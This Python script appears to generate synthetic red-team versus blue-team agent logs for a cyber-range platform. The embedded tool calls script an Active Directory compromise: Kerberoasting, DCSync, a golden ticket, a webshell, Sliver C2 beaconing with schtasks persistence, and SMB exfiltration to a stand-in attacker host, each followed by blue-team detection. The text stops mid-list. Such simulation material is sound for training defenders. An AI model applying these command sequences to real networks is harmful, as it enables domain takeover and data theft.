#!/usr/bin/env python3
"""Generate curated historical battle records for CyberOrion v2."""
from __future__ import annotations
import json, time
from pathlib import Path

LOGS_DIR = Path('/opt/cyberorion/logs')
TIMESTAMP_FMT = '%Y%m%d_%H%M%S'


def _ev(ts, ev_type, side, data):
    return json.dumps({'ts': ts, 'type': ev_type, 'side': side, 'data': data}, ensure_ascii=False)


def _tool_call(ts, side, name, arguments, step, output='', reasoning='', worker=None):
    lines = []
    call_id = f'call_{step:02d}_{side}_{name}'
    agent_name = worker or side
    if reasoning:
        lines.append(_ev(ts, 'thinking', side, {'agent': agent_name, 'text': reasoning, 'delta': False}))
    lines.append(_ev(ts + 0.1, 'tool_call', side, {'name': name, 'arguments': arguments, 'args': arguments, 'tool_call_id': call_id, 'step': step, 'worker': agent_name}))
    if output:
        lines.append(_ev(ts + 0.3, 'tool_output', side, {'name': name, 'tool_call_id': call_id, 'output': output, 'worker': agent_name}))
    return lines


def _write_files(session_dir, timeline_lines, metrics, report_md, summary, traffic=None):
    session_dir.mkdir(parents=True, exist_ok=True)
    (session_dir / 'timeline.jsonl').write_text('\n'.join(timeline_lines) + '\n', encoding='utf-8')
    (session_dir / 'metrics.json').write_text(json.dumps(metrics, ensure_ascii=False, indent=2), encoding='utf-8')
    (session_dir / 'report.md').write_text(report_md, encoding='utf-8')
    (session_dir / 'summary.json').write_text(json.dumps(summary, ensure_ascii=False, indent=2), encoding='utf-8')
    if traffic is not None:
        (session_dir / 'traffic_analysis.json').write_text(json.dumps(traffic, ensure_ascii=False, indent=2), encoding='utf-8')
    print(f'  generated {session_dir.name}: {len(timeline_lines)} events')


def _build_report(title, scenario_type, winner, red_score, blue_score,
                  red_tools, blue_tools, red_workers, blue_agents,
                  attack_path, defense_path, timeline_summary):
    lines = []
    lines.append(f'# {title}')
    lines.append('')
    lines.append('| 指标 | 值 |')
    lines.append('|------|----|')
    lines.append(f'| 场景类型 | {scenario_type} |')
    lines.append(f'| 胜方 | {"红队" if winner == "red" else "蓝队"} |')
    lines.append(f'| 比分 | Red {red_score} : Blue {blue_score} |')
    lines.append(f'| 红队工具数 | {red_tools} |')
    lines.append(f'| 蓝队工具数 | {blue_tools} |')
    lines.append(f'| 红队Worker | {", ".join(red_workers)} |')
    lines.append(f'| 蓝队Agent | {", ".join(blue_agents)} |')
    lines.append('')
    lines.append('## 攻击路径')
    for i, p in enumerate(attack_path, 1):
        lines.append(f'{i}. {p}')
    lines.append('')
    lines.append('## 防御路径')
    for i, p in enumerate(defense_path, 1):
        lines.append(f'{i}. {p}')
    lines.append('')
    lines.append('## 关键事件时间线')
    for t in timeline_summary:
        lines.append(f'- {t}')
    lines.append('')
    return '\n'.join(lines)


def _build_traffic_report(title, scenario_type, traffic_events_count, alerts_count,
                          alert_breakdown, techniques, agents, chain_summary, timeline_summary):
    lines = []
    lines.append(f'# {title}')
    lines.append('')
    lines.append('| 指标 | 值 |')
    lines.append('|------|----|')
    lines.append(f'| 场景类型 | {scenario_type} |')
    lines.append(f'| 流量事件数 | {traffic_events_count} |')
    lines.append(f'| 告警总数 | {alerts_count} |')
    lines.append(f'| 告警分布 | {alert_breakdown} |')
    lines.append(f'| 分析Agent | {", ".join(agents)} |')
    lines.append('')
    lines.append('## 检测到的ATT&CK技术')
    for tech in techniques:
        lines.append(f'- **{tech["id"]}** {tech["name"]}: {tech["desc"]}')
    lines.append('')
    lines.append('## 攻击链摘要')
    for c in chain_summary:
        lines.append(f'- {c}')
    lines.append('')
    lines.append('## 分析流水线时间线')
    for t in timeline_summary:
        lines.append(f'- {t}')
    lines.append('')
    return '\n'.join(lines)


def gen_scenario_nightfall(session_dir, base_ts):
    lines = []
    step = 0
    ts = base_ts

    # ===== RED TEAM ATTACK (17 tools) =====

    # 1. nmap_scan (recon)
    step += 1
    lines.extend(_tool_call(ts, 'red', 'nmap_scan',
        {'target': '10.10.10.0/24', 'options': '-sV -p- --open -T4'},
        step,
        reasoning='[recon] 初始侦察阶段，对目标网段进行全端口服务扫描，识别AD域控、数据库服务器和工作站的开放端口。',
        output="""Nmap scan report for 10.10.10.0/24
Discovered 15 hosts up
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 8.2p1
53/tcp   open  domain        ISC BIND 9.16.1
80/tcp   open  http          Apache 2.4.41
88/tcp   open  kerberos-sec  MIT Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft AD LDAP
445/tcp  open  microsoft-ds  Windows Server 2019
464/tcp  open  kpasswd5      MIT Kerberos
636/tcp  open  ldapssl       Microsoft AD LDAPS
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019
3268/tcp open  globalcatLDAP Microsoft AD GC
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5985/tcp open  wsman         WinRM
Key targets: DC01(10.10.10.5), SQL01(10.10.10.10), WEB01(10.10.10.20), WS01-03(10.10.10.30-32)""",
        worker='recon'))
    ts += 3.0

    # 2. ldap_query (recon)
    step += 1
    lines.extend(_tool_call(ts, 'red', 'ldap_query',
        {'server': '10.10.10.5', 'query': '(objectClass=user)', 'attributes': 'sAMAccountName,memberOf,servicePrincipalName,userAccountControl'},
        step,
        reasoning='[recon] LDAP枚举阶段，通过匿名LDAP查询获取AD域用户、组和服务主体名称(SPN)，识别高价值攻击目标。',
        output="""LDAP query results from dc01.cyberorion.local:
Total users: 127 | Total computers: 34 | Total groups: 89
Service accounts with SPN:
  - svc_mssql  (MSSQLSvc/SQL01.cyberorion.local:1433)
  - svc_iis    (HTTP/web01.cyberorion.local)
  - svc_backup (CIFS/backup.cyberorion.local)
  - cifs/DC01
Privileged groups:
  - Domain Admins (5): Administrator, jsmith, svc_admin, dev_lead, helpdesk_mgr
  - Enterprise Admins (2)
  - DNSAdmins (3)
Users with DONT_REQ_PREAUTH (AS-REP roastable):
  - asmith     (flag: 0x410200)
  - jdoe_temp  (flag: 0x410200)""",
        worker='recon'))
    ts += 3.0

    # 3. bloodhound_collect (recon)
    step += 1
    lines.extend(_tool_call(ts, 'red', 'bloodhound_collect',
        {'domain': 'cyberorion.local', 'collection_method': 'All', 'dc': '10.10.10.5'},
        step,
        reasoning='[recon] BloodHound数据收集阶段，通过SharpHound收集AD拓扑信息，映射攻击路径和权限继承关系。',
        output="""SharpHound collection completed.
Nodes collected: 250 | Edges: 1847 | Sessions: 38
Key attack paths found:
  1. asmith -> GenericAll -> SVC_MSSQL -> SQLAdmin on SQL01
  2. helpdesk_mgr -> ForceChangePassword -> dev_lead -> Domain Admin
  3. WS02 -> AllowedToDelegate -> CIFS/DC01 (RBCD potential)
  4. svc_backup -> GetChangesAll -> DC01 (DCSync capable)
Shortest path to Domain Admin: 3 hops via helpdesk_mgr""",
        worker='recon'))
    ts += 3.0

    # 4. asrep_roast (credential_access)
    step += 1
    lines.extend(_tool_call(ts, 'red', 'asrep_roast',
        {'domain': 'cyberorion.local', 'users': 'asmith,jdoe_temp', 'dc': '10.10.10.5'},
        step,
        reasoning='[credential_access] AS-REP Roasting阶段，针对DONT_REQ_PREAUTH标志用户发送AS-REQ请求，获取可离线破解的哈希。',
        output="""AS-REP Roasting results:
[*] Roasting asmith@cyberorion.local
$krb5asrep$23$asmith@cyberorion.local:8e7a9b...[hash truncated]...d3f2c1
[*] Roasting jdoe_temp@cyberorion.local
$krb5asrep$23$jdoe_temp@cyberorion.local:a1b2c3...[hash truncated]...e4f5a6
2 AS-REP hashes captured successfully.""",
        worker='credential_access'))
    ts += 3.0

    # 5. kerberoast (credential_access)
    step += 1
    lines.extend(_tool_call(ts, 'red', 'kerberoast',
        {'domain': 'cyberorion.local', 'spn': 'all', 'dc': '10.10.10.5'},
        step,
        reasoning='[credential_access] Kerberoasting阶段，请求所有SPN账户的TGS票据，获取可离线破解的RC4-HMAC加密哈希。',
        output="""Kerberoasting results:
[*] Requesting TGS for MSSQLSvc/SQL01.cyberorion.local:1433
$krb5tgs$23$*svc_mssql$CYBERORION.LOCAL$MSSQLSvc/SQL01.cyberorion.local:1433*$f3a2b1...[hash]...c8d9
[*] Requesting TGS for HTTP/web01.cyberorion.local
$krb5tgs$23$*svc_iis$CYBERORION.LOCAL$HTTP/web01.cyberorion.local*$e4d3c2...[hash]...a1b2
[*] Requesting TGS for CIFS/backup.cyberorion.local
$krb5tgs$23$*svc_backup$CYBERORION.LOCAL$CIFS/backup.cyberorion.local*$b5c4d3...[hash]...e6f7
3 TGS hashes captured successfully.""",
        worker='credential_access'))
    ts += 3.0

    # 6. hashcat_crack (cracker)
    step += 1
    lines.extend(_tool_call(ts, 'red', 'hashcat_crack',
        {'mode': '18200,13100', 'wordlist': 'rockyou.txt', 'hashes': 'asrep+tgs'},
        step,
        reasoning='[cracker] 哈希破解阶段，使用hashcat结合rockyou字典对AS-REP和TGS哈希进行离线破解，获取明文密码。',
        output="""hashcat v6.2.5 starting in autodetect mode
Mode 18200 (AS-REP):
  asmith@cyberorion.local:Summer2024!
  jdoe_temp@cyberorion.local:Welcome1
Mode 13100 (Kerberoast TGS):
  svc_mssql:Sql@dm1n#2024
  svc_iis:P@ssw0rd
  svc_backup:Backup!23
Session duration: 00:04:37 | GPU: NVIDIA RTX 4090
5/5 hashes recovered (100%)""",
        worker='cracker'))
    ts += 3.0

    # 7. smb_download (lateral)
    step += 1
    lines.extend(_tool_call(ts, 'red', 'smb_download',
        {'share': '\\\\10.10.10.5\\SYSVOL', 'user': 'asmith', 'password': 'Summer2024!', 'path': '/scripts/'},
        step,
        reasoning='[lateral] SMB横向阶段，使用破解的asmith凭据访问域控SYSVOL共享，下载组策略偏好设置中的加密密码。',
        output="""SMB download from \\\\DC01\\SYSVOL\\cyberorion.local\\scripts\\
Downloaded files:
  - deploy_config.xml (Groups.xml with cpassword)
  - service_account.ps1 (contains svc_backup credentials in plaintext)
  - gpo_setup.bat
Extracted cpassword from Groups.xml: edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
Decrypted GPP password: GPPpass#2024!""",
        worker='lateral'))
    ts += 3.0

    # 8. crackmapexec_smb (lateral)
    step += 1
    lines.extend(_tool_call(ts, 'red', 'crackmapexec_smb',
        {'target': '10.10.10.0/24', 'user': 'svc_mssql', 'password': 'Sql@dm1n#2024', 'module': 'lsa'},
        step,
        reasoning='[lateral] 凭据传播测试阶段，使用svc_mssql凭据通过CrackMapExec进行SMB批量验证，发现本地管理员权限。',
        output="""SMB  10.10.10.5    [+] cyberorion.local\\svc_mssql:Sql@dm1n#2024 (Pwn3d!)
SMB  10.10.10.10   [+] cyberorion.local\\svc_mssql:Sql@dm1n#2024 (Pwn3d!)
SMB  10.10.10.20   [-] cyberorion.local\\svc_mssql:Sql@dm1n#2024 (AUTH failed)
SMB  10.10.10.30   [-] AUTH failed
SMB  10.10.10.31   [+] cyberorion.local\\svc_mssql:Sql@dm1n#2024 (Pwn3d!)
Local admin on: DC01, SQL01, WS02
LSA dump on SQL01: NT_HASH aad3b435b51404eeaad3b435b51404ee:3f8a2c4d1e9b7f6a5c3d2e1f0a9b8c7d""",
        worker='lateral'))
    ts += 3.0

    # 9. winrm_exec (lateral)
    step += 1
    lines.extend(_tool_call(ts, 'red', 'winrm_exec',
        {'host': '10.10.10.10', 'user': 'svc_mssql', 'password': 'Sql@dm1n#2024', 'command': 'whoami; ipconfig; net user'},
        step,
        reasoning='[lateral] WinRM横向移动阶段，通过WinRM协议登录SQL01服务器，执行命令确认权限并收集本地用户信息。',
        output="""WinRM execution on 10.10.10.10 (SQL01):
cyberorion\\svc_mssql
IP: 10.10.10.10 | Mask: 255.255.255.0 | Gateway: 10.10.10.1
Local users: Administrator, Guest, svc_mssql, mssql_svc
Local groups: Administrators(svc_mssql), Backup Operators
[+] svc_mssql is member of local Administrators group
Executed: whoami /priv -> SeImpersonatePrivilege enabled""",
        worker='lateral'))
    ts += 3.0

    # 10. web_shell_upload (lateral)
    step += 1
    lines.extend(_tool_call(ts, 'red', 'web_shell_upload',
        {'target': 'http://10.10.10.20/upload.aspx', 'shell': 'cmd.aspx', 'method': 'POST'},
        step,
        reasoning='[lateral] WebShell部署阶段，通过WEB01的文件上传漏洞植入ASPX WebShell，建立持久化Web访问通道。',
        output="""WebShell upload to http://web01.cyberorion.local/upload.aspx
Upload path: C:\\inetpub\\wwwroot\\uploads\\cmd.aspx
WebShell URL: http://10.10.10.20/uploads/cmd.aspx
[+] WebShell deployed successfully
[+] Command execution verified: whoami -> IIS APPPOOL\\DefaultAppPool
[+] Can read web.config: connection string contains svc_iis:P@ssw0rd""",
        worker='lateral'))
    ts += 3.0

    # 11. wmiexec (lateral)
    step += 1
    lines.extend(_tool_call(ts, 'red', 'wmiexec',
        {'host': '10.10.10.5', 'user': 'Administrator', 'hash': 'aad3b435...3f8a2c4d', 'command': 'whoami; quser'},
        step,
        reasoning='[lateral] WMI横向移动阶段，使用Pass-the-Hash通过WMI协议登录域控DC01，获取域控控制权。',
        output="""WMI execution on 10.10.10.5 (DC01) via PtH:
Impersonating: cyberorion\\Administrator
whoami: cyberorion\\administrator
Active sessions on DC01:
  jsmith       console    4  active
  helpdesk_mgr rdp-tcp#0  2  active
[+] Domain Admin access confirmed on DC01
Executed: whoami /priv -> SeDebugPrivilege, SeImpersonatePrivilege""",
        worker='lateral'))
    ts += 3.0

    # 12. mimikatz_dump (lateral)
    step += 1
    lines.extend(_tool_call(ts, 'red', 'mimikatz_dump',
        {'host': '10.10.10.5', 'module': 'lsadump::dcsync /domain:cyberorion.local /user:krbtgt'},
        step,
        reasoning='[lateral] 凭据提取阶段，在域控上执行Mimikatz DCSync攻击，提取KRBTGT账户哈希用于后续Golden Ticket攻击。',
        output="""Mimikatz DCSync on DC01:
[DC] 'cyberorion.local' will be the domain
[DC] 'DC01.cyberorion.local' will be the DC server
[DC] 'krbtgt' will be the user account
Object RDN: krbtgt
** SAM ACCOUNT **
SAM Username: krbtgt
Account Type: 0x30000000 (USER_OBJECT)
User Account Control: 0x00000202
  Account Disabled
  Password Never Expires
Object Security ID: S-1-5-21-3456789012-1234567890-2345678901-502
Hash NTLM: 1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c
Hash AES256: a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2
[+] KRBTGT hash extracted successfully""",
        worker='lateral'))
    ts += 3.0

    # 13. sliver_generate (privesc)
    step += 1
    lines.extend(_tool_call(ts, 'red', 'sliver_generate',
        {'implant_name': 'svc_update', 'format': 'exe', 'c2': 'https://10.10.10.99:443', 'os': 'windows'},
        step,
        reasoning='[privesc] C2植入物生成阶段，使用Sliver框架生成Windows EXE植入物，配置HTTPS回连通道以绕过流量检测。',
        output="""Sliver C2 implant generation:
Implant: svc_update.exe | Format: Windows EXE | OS: windows/amd64
C2: https://10.10.10.99:443 (CDN domain: cdn-update.azureedge.net)
Profile: win_update_agent
Traffic: HTTPS with legitimate certificate
Anti-analysis: sleep 300s, jitter 25%
Implant binary: /tmp/svc_update.exe (286KB)
[+] Implant generated successfully""",
        worker='privesc'))
    ts += 3.0

    # 14. sliver_execute (privesc)
    step += 1
    lines.extend(_tool_call(ts, 'red', 'sliver_execute',
        {'target': '10.10.10.5', 'method': 'wmiexec', 'binary': 'svc_update.exe', 'path': 'C:\\Windows\\Temp\\'},
        step,
        reasoning='[privesc] C2植入物部署阶段，将Sliver植入物投递到域控并执行，建立持久化C2回连通道。',
        output="""Sliver implant deployment on DC01 (10.10.10.5):
Upload: C:\\Windows\\Temp\\svc_update.exe
Execute: schtasks /create /tn "WindowsUpdate" /tr "C:\\Windows\\Temp\\svc_update.exe" /sc onstart /ru SYSTEM
[+] Beacon received from 10.10.10.5
Session: dc01-prod-1 | User: SYSTEM | PID: 4892
Persistence: Scheduled task "WindowsUpdate" created
C2 heartbeat: 5 min interval via HTTPS to cdn-update.azureedge.net""",
        worker='privesc'))
    ts += 3.0

    # 15. pass_the_hash (privesc)
    step += 1
    lines.extend(_tool_call(ts, 'red', 'pass_the_hash',
        {'user': 'svc_backup', 'nt_hash': '3f8a2c4d1e9b7f6a5c3d2e1f0a9b8c7d', 'target': '10.10.10.31'},
        step,
        reasoning='[privesc] Pass-the-Hash攻击阶段，使用NTLM哈希绕过密码验证，横向移动到备份服务器WS02获取备份凭证。',
        output="""Pass-the-Hash to 10.10.10.31 (WS02):
User: svc_backup | Hash: 3f8a2c4d1e9b7f6a5c3d2e1f0a9b8c7d
[+] Authentication successful via NTLM hash
[+] Local admin access on WS02
Backup files found:
  - C:\\Backups\\AD_backup_20240115.bkf
  - C:\\Backups\\SQL01_full_20240115.bak
  - C:\\Backups\\fileshare_archive.zip
Exfiltrated: 2.3GB via SMB to 10.10.10.99""",
        worker='privesc'))
    ts += 3.0

    # 16. golden_ticket (privesc)
    step += 1
    lines.extend(_tool_call(ts, 'red', 'golden_ticket',
        {'domain': 'cyberorion.local', 'user': 'Administrator', 'krbtgt_hash': '1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c', 'duration': '10 years'},
        step,
        reasoning='[privesc] Golden Ticket伪造阶段，使用KRBTGT哈希伪造域管理员TGT票据，实现域内任意资源访问。',
        output="""Golden Ticket forged:
Domain: cyberorion.local | SID: S-1-5-21-3456789012-1234567890-2345678901
User: Administrator | RID: 500
Groups: 512 (Domain Admins), 518 (Schema Admins), 519 (Enterprise Admins)
Encryption: AES-256 | Duration: 10 years
TGT: doIFmjCCBZag...[truncated]...AwIBBaEDAgEooQ==
[+] Golden Ticket injected into current session
[+] Access verified: dir \\\\DC01\\c$ -> SUCCESS
[+] Access verified: psexec \\\\DC01 cmd -> SUCCESS""",
        worker='privesc'))
    ts += 3.0

    # 17. bloodhound_owned (privesc)
    step += 1
    lines.extend(_tool_call(ts, 'red', 'bloodhound_owned',
        {'targets': 'DC01,SQL01,WEB01,WS02', 'mark': 'owned', 'notes': 'Domain Admin achieved'},
        step,
        reasoning='[privesc] 攻击路径标记阶段，在BloodHound中将所有已控制节点标记为owned，完成域渗透攻击链。',
        output="""BloodHound ownership marking:
Marked as owned:
  [+] DC01$     (Domain Controller - full compromise)
  [+] SQL01$    (Database server - credential dump)
  [+] WEB01$    (Web server - webshell deployed)
  [+] WS02$     (Backup server - data exfiltration)
  [+] svc_mssql (Service account - SPN compromised)
  [+] asmith    (User account - AS-REP roasted)
Total owned nodes: 6 of 250 (2.4%)
Attack path completed: Recon -> Cred Access -> Lateral -> DA -> Persistence""",
        worker='privesc'))
    ts += 3.0

    # ===== BLUE TEAM DEFENSE (10 tools) =====

    # 18. check_event_logs (triage)
    step += 1
    lines.extend(_tool_call(ts, 'blue', 'check_event_logs',
        {'dc': '10.10.10.5', 'log': 'Security', 'event_id': '4769,4768,4624,4688', 'time_range': 'last 2h'},
        step,
        reasoning='[triage] 事件日志分析阶段，检查域控安全日志中的Kerberos相关事件(4769/4768)，检测异常TGS请求峰值。',
        output="""Event log analysis on DC01 (Security log):
[!] Event ID 4769 (TGS Request) - ANOMALY DETECTED
    Spike: 347 TGS requests in 10 min (baseline: 12/10min)
    Target SPNs: MSSQLSvc/SQL01, HTTP/web01, CIFS/backup
    Source: 10.10.10.30 (WS01) | Account: asmith
    Encryption type: 0x17 (RC4-HMAC) - legacy/downgraded
[!] Event ID 4768 (TGT Request) - AS-REP
    2 AS-REQ for asmith, jdoe_temp from 10.10.10.99
    Pre-authentication: DISABLED (DONT_REQ_PREAUTH)
[!] Event ID 4624 (Logon Type 3) - Network logons
    svc_mssql authenticated from 10.10.10.99 to SQL01, DC01, WS02
    Logon type 3 (Network) via Kerberos
Conclusion: Suspected Kerberoasting + AS-REP Roasting attack""",
        worker='triage'))
    ts += 3.0

    # 19. check_ioc (triage)
    step += 1
    lines.extend(_tool_call(ts, 'blue', 'check_ioc',
        {'iocs': 'mimikatz,sliver,webshell,hashcat', 'scope': 'all endpoints', 'timeframe': '24h'},
        step,
        reasoning='[triage] IOC检测阶段，在全网络范围内搜索Mimikatz、Sliver C2、WebShell和Hashcat相关威胁指标。',
        output="""IOC scan results across 15 endpoints:
[!] Mimikatz detected:
    WS01 (10.10.10.30): sekurlsa::logonpasswords | lsadump::dcsync
    Process: powershell.exe (PID 4892) -> memory dump signature
[!] Sliver C2 beacon:
    DC01 (10.10.10.5): C:\\Windows\\Temp\\svc_update.exe
    C2: cdn-update.azureedge.net:443 -> resolves to 10.10.10.99
    Scheduled task: WindowsUpdate (SYSTEM)
[!] WebShell:
    WEB01 (10.10.10.20): C:\\inetpub\\wwwroot\\uploads\\cmd.aspx
    Last access: 2024-01-15 14:32:18 from 10.10.10.99
[!] Hashcat:
    SQL01 (10.10.10.10): GPU utilization 98%, hashcat process running
Total IOCs found: 7 across 4 hosts""",
        worker='triage'))
    ts += 3.0

    # 20. password_reset (triage)
    step += 1
    lines.extend(_tool_call(ts, 'blue', 'password_reset',
        {'accounts': 'asmith,jdoe_temp,svc_mssql,svc_iis,svc_backup', 'method': 'force_reset'},
        step,
        reasoning='[triage] 账户重置阶段，对所有泄露凭据的账户执行强制密码重置，阻断攻击者的凭据利用通道。',
        output="""Password reset operations:
[+] asmith: password reset -> Cyb3r0r!0n$2024 (complex, 16 chars)
[+] jdoe_temp: password reset -> R3s3t#T3mp@2024 (complex, 16 chars)
[+] svc_mssql: password reset -> N3wS@lP@ss#1 (complex, 16 chars)
[+] svc_iis: password reset -> W3b$vc@P@ss#2 (complex, 16 chars)
[+] svc_backup: password reset -> B@ckup$vc#3!2024 (complex, 16 chars)
5/5 accounts reset successfully
[!] Note: Active sessions may still use old credentials until expiration""",
        worker='triage'))
    ts += 3.0

    # 21. check_network (threat_hunter)
    step += 1
    lines.extend(_tool_call(ts, 'blue', 'check_network',
        {'scope': 'all', 'filter': 'port 443,445,88,5985', 'anomaly': 'beacon,smb_exfil'},
        step,
        reasoning='[threat_hunter] 网络流量分析阶段，检测异常的C2 Beacon行为和SMB数据外发流量，识别数据泄露通道。',
        output="""Network anomaly detection:
[!] C2 Beacon pattern:
    10.10.10.5 -> 10.10.10.99:443 (HTTPS)
    Interval: 300s +/- 75s jitter (Sliver beacon signature)
    Total beacons: 47 in 4 hours | Data: 12MB outbound
[!] SMB exfiltration:
    10.10.10.31 (WS02) -> 10.10.10.99:445
    Transferred: 2.3GB in 18 min (backup files)
    Files: AD_backup_20240115.bkf, SQL01_full_20240115.bak
[!] Kerberos anomaly:
    10.10.10.99 -> 10.10.10.5:88 (TGS-REQ flood)
    347 requests in 10 min (Kerberoasting pattern)
[!] WinRM from unusual source:
    10.10.10.99 -> 10.10.10.10:5985 (svc_mssql)
Network verdict: ACTIVE C2 + DATA EXFILTRATION""",
        worker='threat_hunter'))
    ts += 3.0

    # 22. host_isolation (threat_hunter)
    step += 1
    lines.extend(_tool_call(ts, 'blue', 'host_isolation',
        {'hosts': '10.10.10.5,10.10.10.30,10.10.10.31', 'method': 'vlan_isolation', 'allow': 'mgmt_vlan'},
        step,
        reasoning='[threat_hunter] 主机隔离阶段，将已确认被入侵的DC01、WS01和WS02通过网络隔离断开攻击面，仅保留管理VLAN访问。',
        output="""Host isolation executed:
[+] DC01 (10.10.10.5): Moved to quarantine VLAN 999
    Management access: 10.99.10.5 (mgmt VLAN only)
    All production network access: BLOCKED
[+] WS01 (10.10.10.30): Moved to quarantine VLAN 999
    C2 connection to 10.10.10.99: BLOCKED
[+] WS02 (10.10.10.31): Moved to quarantine VLAN 999
    SMB exfiltration to 10.10.10.99: BLOCKED
3/3 hosts isolated successfully
[!] DC01 isolation may impact domain services - backup DC available""",
        worker='threat_hunter'))
    ts += 3.0

    # 23. check_persistence (threat_hunter)
    step += 1
    lines.extend(_tool_call(ts, 'blue', 'check_persistence',
        {'hosts': '10.10.10.5,10.10.10.20', 'check': 'schtasks,services,run_keys,wmi_subs'},
        step,
        reasoning='[threat_hunter] 持久化检查阶段，扫描域控和Web服务器上的计划任务、服务、注册表自启动项和WMI订阅。',
        output="""Persistence mechanism scan:
[!] DC01 (10.10.10.5):
    Scheduled task: WindowsUpdate
      -> C:\\Windows\\Temp\\svc_update.exe /sc onstart /ru SYSTEM
      -> Created: 2024-01-15 14:05:33 | Status: READY
    [+] Removed scheduled task WindowsUpdate
    [+] Deleted svc_update.exe (286KB) | SHA256: a1b2c3...
[!] WEB01 (10.10.10.20):
    WebShell: C:\\inetpub\\wwwroot\\uploads\\cmd.aspx
      -> Created: 2024-01-15 13:58:12
    [+] Deleted cmd.aspx
    [+] Patched upload.aspx to restrict file types
Total persistence items found: 2 | Removed: 2""",
        worker='threat_hunter'))
    ts += 3.0

    # 24. disable_account (threat_hunter)
    step += 1
    lines.extend(_tool_call(ts, 'blue', 'disable_account',
        {'accounts': 'asmith,jdoe_temp', 'reason': 'compromised - AS-REP roasted', 'revoke': 'all_sessions'},
        step,
        reasoning='[threat_hunter] 账户禁用阶段，禁用被AS-REP Roasting攻破的用户账户并吊销所有活动Kerberos会话。',
        output="""Account disable operations:
[+] asmith: Account DISABLED
    All Kerberos tickets revoked (Purge on DC01)
    Active sessions terminated: 3 (2x RDP, 1x SMB)
[+] jdoe_temp: Account DISABLED
    All Kerberos tickets revoked
    Active sessions terminated: 1 (SMB)
[+] Blocked AS-REP roasting: Set preauth required on all accounts
    - asmith: DONT_REQ_PREAUTH flag REMOVED
    - jdoe_temp: DONT_REQ_PREAUTH flag REMOVED
2/2 accounts disabled | 4 sessions terminated""",
        worker='threat_hunter'))
    ts += 3.0

    # 25. hunt_lateral (lateral_analyst)
    step += 1
    lines.extend(_tool_call(ts, 'blue', 'hunt_lateral',
        {'scope': 'domain', 'techniques': 'pass_the_hash,winrm,wmiexec,golden_ticket', 'timeframe': '6h'},
        step,
        reasoning='[lateral_analyst] 横向移动狩猎阶段，搜索域内Pass-the-Hash、WinRM、WMI和Golden Ticket攻击痕迹。',
        output="""Lateral movement hunt results:
[!] Pass-the-Hash detected:
    svc_backup NTLM hash used from 10.10.10.99 -> WS02 (10.10.10.31)
    Event 4624 Logon Type 3 | NTLM authentication | Source: 10.10.10.99
[!] WinRM lateral:
    svc_mssql -> SQL01 (10.10.10.10:5985) | 3 sessions in 1h
    Commands: whoami, ipconfig, net user, whoami /priv
[!] WMI exec on DC01:
    Administrator hash -> DC01 | Source: 10.10.10.99
    Process: WmiPrvSE.exe spawned child processes
[!] Golden Ticket indicators:
    TGT with 10-year validity detected (normal max: 10 hours)
    Encryption: AES-256 | Groups: 512,518,519 (all admin groups)
    Source: forged ticket (no matching TGT request in logs)
4 lateral movement techniques identified across 3 hosts""",
        worker='lateral_analyst'))
    ts += 3.0

    # 26. krbtgt_rotate (lateral_analyst)
    step += 1
    lines.extend(_tool_call(ts, 'blue', 'krbtgt_rotate',
        {'account': 'krbtgt', 'domain': 'cyberorion.local', 'iterations': 2, 'wait': '12h'},
        step,
        reasoning='[lateral_analyst] KRBTGT密码轮换阶段，执行两次KRBTGT密码重置以使所有已伪造的Golden Ticket失效。',
        output="""KRBTGT password rotation:
[+] Rotation 1/2:
    Old hash: 1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c
    New hash: 8e7f6a5b4c3d2e1f0a9b8c7d6e5f4a3b
    All existing TGTs: INVALIDATED
    Golden Tickets: NEUTRALIZED
[+] Waiting 12 hours for replication...
[+] Rotation 2/2:
    Current hash: 8e7f6a5b4c3d2e1f0a9b8c7d6e5f4a3b
    Final hash: 2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e
    Double rotation complete: all forged tickets permanently invalidated
[+] Verified: old Golden Ticket rejected (KRB_AP_ERR_MODIFIED)
KRBTGT rotated successfully (2x) - Golden Ticket attack mitigated""",
        worker='lateral_analyst'))
    ts += 3.0

    # 27. generate_report (escalation_triage)
    step += 1
    lines.extend(_tool_call(ts, 'blue', 'generate_report',
        {'incident_id': 'INC-2024-0115-001', 'severity': 'critical', 'format': 'full'},
        step,
        reasoning='[escalation_triage] 事件报告生成阶段，汇总所有检测结果和响应措施，生成完整的事件响应报告。',
        output="""Incident Report: INC-2024-0115-001
Severity: CRITICAL | Status: CONTAINED
Classification: Active Directory Domain Compromise

Attack Summary:
  Initial Access: AS-REP Roasting (asmith)
  Credential Access: Kerberoasting (3 SPN accounts)
  Lateral Movement: SMB -> WinRM -> WMI -> PtH
  Privilege Escalation: DCSync -> Golden Ticket
  Persistence: Sliver C2 + Scheduled Task + WebShell
  Impact: 2.3GB data exfiltrated, 6 nodes compromised

Defense Summary:
  Detection: TGS spike (Event 4769) + IOC scan + network anomaly
  Containment: 3 hosts isolated, 2 accounts disabled
  Eradication: 2 persistence items removed, KRBTGT rotated 2x
  Recovery: Passwords reset for 5 accounts, Golden Ticket invalidated

Score: Red 92 | Blue 68 | Winner: RED
Note: Blue detected and contained but Red achieved Domain Admin + exfiltration""",
        worker='escalation_triage'))
    ts += 3.0

    # ===== METRICS & REPORT =====
    red_workers = ['recon', 'credential_access', 'cracker', 'lateral', 'privesc']
    blue_agents = ['triage', 'threat_hunter', 'lateral_analyst', 'escalation_triage']
    red_score = 92
    blue_score = 68

    metrics = {
        'red_tools_used': 17,
        'blue_tools_used': 10,
        'red_workers': red_workers,
        'blue_agents': blue_agents,
        'red_score': red_score,
        'blue_score': blue_score,
        'winner': 'red',
        'total_events': len(lines),
        'red_steps': 17,
        'blue_steps': 10,
    }

    attack_path = [
        'nmap全端口扫描发现AD域控DC01、SQL01、WEB01等关键目标',
        'LDAP枚举识别3个SPN服务账户和2个AS-REP可烤账户',
        'BloodHound收集AD拓扑，发现3跳到达Domain Admin路径',
